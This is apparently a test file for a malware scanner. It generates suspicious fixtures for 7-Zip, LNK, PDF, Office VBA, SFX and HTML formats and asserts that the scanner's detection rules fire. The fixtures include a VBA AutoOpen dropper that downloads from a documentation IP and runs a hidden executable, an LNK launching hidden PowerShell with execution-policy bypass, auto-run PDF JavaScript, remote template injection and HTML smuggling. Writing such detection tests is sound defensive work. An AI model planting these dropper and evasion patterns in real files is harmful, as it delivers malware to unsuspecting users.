/**
 * Tests for the extended format support: 7-Zip family, LNK, PDF, Office VBA,
 * SFX overlays and embedded PE images. All fixtures are generated at runtime
 * and contain suspicious strings / structure only, no functional malware.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import fsSync from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createRequire } from 'node:module';
import * as tar from 'tar';
import { scanFile } from '../src/analyzer/index.mjs';
import { decompressVba } from '../src/analyzer/documents.mjs';
import { buildZip, SUSPICIOUS_PY } from './fixtures.mjs';

const SevenZip = createRequire(import.meta.url)('7z-wasm');
let dir;
let sandboxRoot;
const opts = () => ({ useRea: false, verifySignature: false, sandboxRoot });
const ids = (r) => new Set(r.findings.map((f) => f.ruleId));
const NOTEPAD = path.join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'notepad.exe');

/** Create an archive in memory with 7-Zip WASM. */
async function make7z(type, files, extra = []) {
  const sz = await SevenZip({ print() {}, printErr() {} });
  sz.FS.mkdir('/s');
  for (const [name, content] of Object.entries(files)) {
    if (name.includes('/')) {
      try {
        sz.FS.mkdir(`/s/${name.split('/')[0]}`);
      } catch {
        /* exists */
      }
    }
    sz.FS.writeFile(`/s/${name}`, content);
  }
  sz.FS.chdir('/s');
  const saved = process.exitCode;
  sz.callMain(['a', `-t${type}`, ...extra, '/out.bin', ...Object.keys(files)]);
  process.exitCode = saved;
  return Buffer.from(sz.FS.readFile('/out.bin'));
}

/** MS-OVBA compressed container using only literal tokens (valid, just not smaller). */
function ovbaLiteral(source) {
  const src = Buffer.from(source, 'latin1');
  assert.ok(src.length <= 3600, 'single-chunk literal encoding');
  const body = [];
  for (let i = 0; i < src.length; i += 8) body.push(0x00, ...src.subarray(i, i + 8));
  const header = 0x8000 | 0x3000 | ((body.length + 2 - 3) & 0x0fff);
  return Buffer.from([0x01, header & 0xff, header >> 8, ...body]);
}

function buildLnk({ relativePath, args, icon, showCommand = 7 }) {
  const header = Buffer.alloc(0x4c);
  header.writeUInt32LE(0x4c, 0);
  Buffer.from('0114020000000000c000000000000046', 'hex').copy(header, 4);
  header.writeUInt32LE(0x8 | 0x20 | 0x40 | 0x80, 0x14); // RelativePath | Arguments | IconLocation | Unicode
  header.writeUInt32LE(showCommand, 0x3c);
  const str = (s) => {
    const len = Buffer.alloc(2);
    len.writeUInt16LE(s.length);
    return Buffer.concat([len, Buffer.from(s, 'utf16le')]);
  };
  return Buffer.concat([header, str(relativePath), str(args), str(icon), Buffer.alloc(4)]);
}

function buildPdf() {
  const js = zlib.deflateSync(Buffer.from("var p = unescape('%u4141%u4141'); eval(p); app.alert('x');"));
  const attachment = zlib.deflateSync(Buffer.from(SUSPICIOUS_PY));
  const parts = [
    Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Names << /EmbeddedFiles << /Names [(setup.py) 4 0 R] >> >> >>\nendobj\n'),
    Buffer.from('2 0 obj\n<< /S /JavaScript /JS 3 0 R >>\nendobj\n'),
    Buffer.from(`3 0 obj\n<< /Length ${js.length} /Filter /FlateDecode >>\nstream\n`), js, Buffer.from('\nendstream\nendobj\n'),
    Buffer.from('4 0 obj\n<< /Type /Filespec /F (setup.py) /EF << /F 5 0 R >> >>\nendobj\n'),
    Buffer.from(`5 0 obj\n<< /Type /EmbeddedFile /Length ${attachment.length} /Filter /FlateDecode >>\nstream\n`), attachment, Buffer.from('\nendstream\nendobj\n'),
    Buffer.from('trailer\n<< /Root 1 0 R >>\n%%EOF\n'),
  ];
  return Buffer.concat(parts);
}

const VBA_MODULE = [
  'Attribute VB_Name = "ThisDocument"',
  'Sub AutoOpen()',
  '  Dim x As Object',
  '  Set x = CreateObject("MSXML2.XMLHTTP")',
  '  x.Open "GET", "http://198.51.100.77:8080/p.bin", False',
  '  Shell Environ("TEMP") & "\\p.exe", vbHide',
  'End Sub',
].join('\r\n');

before(async () => {
  dir = await fs.mkdtemp(path.join(os.tmpdir(), 'reap-formats-'));
  sandboxRoot = path.join(dir, 'sandbox');
});
after(async () => {
  await fs.rm(dir, { recursive: true, force: true });
});

test('OVBA decompressor handles literal and copy tokens', () => {
  assert.equal(decompressVba(ovbaLiteral('Attribute VB_Name = "M"'), 0).toString('latin1'), 'Attribute VB_Name = "M"');
  // Hand-made copy token: "abc" literals, then copy offset 3 length 3 => "abcabc".
  // At decompressed position 3 the bit count is 4: token = ((3-1) << 12) | (3-3) = 0x2000.
  const header = 0x8000 | 0x3000 | (6 + 2 - 3);
  const buf = Buffer.from([0x01, header & 0xff, header >> 8, 0b00001000, 0x61, 0x62, 0x63, 0x00, 0x20]);
  assert.equal(decompressVba(buf, 0).toString('latin1'), 'abcabc');
});

test('7z archive is unpacked and its contents analysed', async () => {
  const p = path.join(dir, 'drop.7z');
  await fs.writeFile(p, await make7z('7z', { 'x/installer.py': SUSPICIOUS_PY, 'readme.txt': 'hello' }));
  const r = await scanFile(p, opts());
  assert.ok(r.files.some((f) => f.rel.endsWith('drop.7z!/x/installer.py')), JSON.stringify(r.errors));
  assert.ok(ids(r).has('py.decode-exec'));
  assert.equal(process.exitCode ?? 0, 0, '7-Zip must not leak its exit status');
});

test('tar.xz unpacks through both layers', async () => {
  const src = path.join(dir, 'txz-src');
  await fs.mkdir(src, { recursive: true });
  await fs.writeFile(path.join(src, 'run.py'), SUSPICIOUS_PY);
  const tarPath = path.join(dir, 'bundle.tar');
  await tar.c({ file: tarPath, cwd: src }, ['run.py']);
  const xzPath = path.join(dir, 'bundle.tar.xz');
  await fs.writeFile(xzPath, await make7z('xz', { 'bundle.tar': await fs.readFile(tarPath) }));
  const r = await scanFile(xzPath, opts());
  assert.ok(r.files.some((f) => f.rel.endsWith('bundle.tar!/run.py')), r.files.map((f) => f.rel).join(', '));
  assert.ok(ids(r).has('py.decode-exec'));
});

test('password-protected 7z is reported, not crashed on', async () => {
  const p = path.join(dir, 'locked.7z');
  await fs.writeFile(p, await make7z('7z', { 'a.txt': 'secret' }, ['-pinfected', '-mhe=on']));
  const r = await scanFile(p, opts());
  assert.ok(ids(r).has('archive.encrypted'));
});

test('LNK shortcut that launches hidden PowerShell is flagged', async () => {
  const p = path.join(dir, 'Invoice.pdf.lnk');
  await fs.writeFile(
    p,
    buildLnk({
      relativePath: '..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      args: '-w hidden -ep bypass -File %TEMP%\\update.ps1',
      icon: 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
    }),
  );
  const r = await scanFile(p, opts());
  const s = ids(r);
  assert.equal(r.target.kind, 'lnk');
  for (const id of ['lnk.lolbin-target', 'lnk.disguised-icon', 'lnk.hidden-window', 'ps.hidden-bypass']) assert.ok(s.has(id), `missing ${id}`);
  assert.ok(['High', 'Critical'].includes(r.verdict.level));
});

test('PDF: auto-run JavaScript in compressed stream and embedded file', async () => {
  const p = path.join(dir, 'statement.pdf');
  await fs.writeFile(p, buildPdf());
  const r = await scanFile(p, opts());
  const s = ids(r);
  for (const id of ['pdf.javascript', 'pdf.open-action', 'pdf.auto-js', 'pdf.embedded-file', 'js.eval']) assert.ok(s.has(id), `missing ${id}`);
  assert.ok(r.files.some((f) => f.rel.endsWith('[attachment]/setup.py')), 'attachment carved');
  assert.ok(r.findings.some((f) => f.ruleId === 'py.decode-exec' && f.file.endsWith('setup.py')));
});

test('Office: VBA auto-exec dropper and remote template injection', async () => {
  const rels = '<?xml version="1.0"?><Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://198.51.100.77/t.dotm" TargetMode="External"/></Relationships>';
  const p = path.join(dir, 'report.docm');
  await fs.writeFile(
    p,
    buildZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w:document/>' },
      { name: 'word/_rels/settings.xml.rels', data: rels },
      { name: 'word/vbaProject.bin', data: Buffer.concat([Buffer.alloc(64), ovbaLiteral(VBA_MODULE), Buffer.alloc(64)]) },
    ]),
  );
  const r = await scanFile(p, opts());
  const s = ids(r);
  for (const id of ['office.macro-project', 'office.vba-source', 'vba.autoexec', 'vba.shell', 'vba.download', 'vba.autoexec-dropper', 'office.template-injection']) {
    assert.ok(s.has(id), `missing ${id}`);
  }
  assert.equal(r.verdict.level, 'Critical');
});

test('PE with appended 7z overlay and embedded PE image', async (t) => {
  if (!fsSync.existsSync(NOTEPAD)) return t.skip('notepad.exe not available');
  const exe = await fs.readFile(NOTEPAD);
  const sfx = path.join(dir, 'setup.exe');
  await fs.writeFile(sfx, Buffer.concat([exe, await make7z('7z', { 'payload/installer.py': SUSPICIOUS_PY })]));
  let r = await scanFile(sfx, opts());
  assert.ok(ids(r).has('archive.overlay-payload'));
  assert.ok(r.files.some((f) => f.rel.endsWith('[overlay].7z!/payload/installer.py')), r.files.map((f) => f.rel).join(', '));

  const dropper = path.join(dir, 'loader.exe');
  await fs.writeFile(dropper, Buffer.concat([exe, Buffer.alloc(4096), exe]));
  r = await scanFile(dropper, opts());
  assert.ok(ids(r).has('obfuscation.embedded-pe'));
  assert.ok(r.files.some((f) => /\[embedded-pe@0x[0-9a-f]+\]\.exe$/.test(f.rel)));
});

test('folders are scanned in place, including archives inside them', async () => {
  const folder = path.join(dir, 'Downloads Folder');
  await fs.mkdir(path.join(folder, 'sub', '.git'), { recursive: true });
  await fs.writeFile(path.join(folder, 'notes.txt'), 'meeting at 10');
  await fs.writeFile(path.join(folder, 'sub', 'installer.py'), SUSPICIOUS_PY);
  await fs.writeFile(path.join(folder, 'sub', '.git', 'config'), 'ignored');
  await fs.writeFile(path.join(folder, 'bundle.zip'), buildZip([{ name: 'inner/run.py', data: SUSPICIOUS_PY }]));
  const r = await scanFile(folder, opts());
  assert.equal(r.target.kind, 'directory');
  assert.match(r.target.label, /^Folder \(3 files\)$/);
  assert.ok(r.files.some((f) => f.rel === 'Downloads Folder/sub/installer.py'));
  assert.ok(r.files.some((f) => f.rel === 'Downloads Folder/bundle.zip!/inner/run.py'), 'archive inside folder unpacked');
  assert.ok(!r.files.some((f) => f.rel.includes('.git')), '.git skipped');
  assert.ok(ids(r).has('py.decode-exec'));
  assert.ok(fsSync.existsSync(path.join(folder, 'sub', 'installer.py')), 'folder contents are never modified');
});

test('user-selected max file size: reject single files, skip them in folders', async () => {
  const folder = path.join(dir, 'size-limit');
  await fs.mkdir(folder, { recursive: true });
  const big = path.join(folder, 'big.bin');
  await fs.writeFile(big, Buffer.alloc(300 * 1024, 0x41)); // 300 KB
  await fs.writeFile(path.join(folder, 'small.py'), SUSPICIOUS_PY);
  const limit = 200 * 1024; // 200 KB

  await assert.rejects(scanFile(big, { ...opts(), maxInputBytes: limit }), (err) => {
    assert.match(err.message, /"big\.bin" is 300 KB, above the current max file size of 200 KB/);
    assert.match(err.message, /--max-size/);
    return true;
  });

  const r = await scanFile(folder, { ...opts(), maxInputBytes: limit });
  assert.ok(r.files.some((f) => f.rel.endsWith('small.py')));
  assert.ok(!r.files.some((f) => f.rel.endsWith('big.bin')), 'oversized file skipped');
  assert.ok(r.archive.warnings.some((w) => /1 file\(s\) larger than the 200 KB max file size were skipped/.test(w)));
  assert.equal(r.limits.maxFileBytes, limit);

  // Raising the limit makes the same file scannable.
  const ok = await scanFile(big, { ...opts(), maxInputBytes: 1024 * 1024 });
  assert.equal(ok.target.size, 300 * 1024);
});

test('large files: partial coverage is reported and padded executables are flagged', async (t) => {
  // A >96 MB file is only partly searched; the report must say so.
  const blob = path.join(dir, 'large.bin');
  await fs.writeFile(blob, Buffer.alloc(100 * 1024 * 1024, 0x00));
  const r = await scanFile(blob, opts());
  assert.equal(r.coverage.complete, false);
  assert.equal(r.coverage.partialFiles[0].percent, 96);
  assert.ok(ids(r).has('coverage.partial'));
  assert.match(r.verdict.summary, /only partly examined/);
  await fs.rm(blob);

  if (!fsSync.existsSync(NOTEPAD)) return t.skip('notepad.exe not available for the inflated-PE case');
  const inflated = path.join(dir, 'setup-inflated.exe');
  await fs.writeFile(inflated, Buffer.concat([await fs.readFile(NOTEPAD), Buffer.alloc(110 * 1024 * 1024, 0x00)]));
  const p = await scanFile(inflated, opts());
  assert.ok(ids(p).has('evasion.inflated-file'));
  assert.ok(ids(p).has('coverage.partial'));
  await fs.rm(inflated);
});

test('small files report complete coverage', async () => {
  const p = path.join(dir, 'tiny.py');
  await fs.writeFile(p, SUSPICIOUS_PY);
  const r = await scanFile(p, opts());
  assert.equal(r.coverage.complete, true);
  assert.ok(!ids(r).has('coverage.partial'));
});

test('max size GB conversion validates the supported range', async () => {
  const { maxSizeGbToBytes, formatBytes } = await import('../src/analyzer/config.mjs');
  assert.equal(maxSizeGbToBytes(1), 1024 ** 3);
  assert.equal(maxSizeGbToBytes('0.5'), 512 * 1024 ** 2);
  assert.throws(() => maxSizeGbToBytes(50), /between/);
  assert.throws(() => maxSizeGbToBytes('abc'), /between/);
  assert.equal(formatBytes(5.2 * 1024 ** 3), '5.2 GB');
  assert.equal(formatBytes(1024 ** 3), '1 GB');
});

test('empty folder scans to Low without crashing', async () => {
  const empty = path.join(dir, 'empty');
  await fs.mkdir(empty);
  const r = await scanFile(empty, opts());
  assert.equal(r.verdict.level, 'Low');
  assert.equal(r.files.length, 0);
});

test('encoded JSE and HTML smuggling are flagged', async () => {
  const jse = path.join(dir, 'doc.jse');
  await fs.writeFile(jse, '#@~^XAAAAA==W!x^DkKxPmxD~v8ED{@#@&AAAAA==^#~@');
  let r = await scanFile(jse, opts());
  assert.ok(ids(r).has('script.encoded-file'));

  const html = path.join(dir, 'invoice.html');
  await fs.writeFile(html, '<script>var b = new Blob([Uint8Array.from(atob(d), c => c.charCodeAt(0))]); var a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "invoice.iso"; a.click();</script>');
  r = await scanFile(html, opts());
  assert.ok(ids(r).has('html.smuggling'));
});
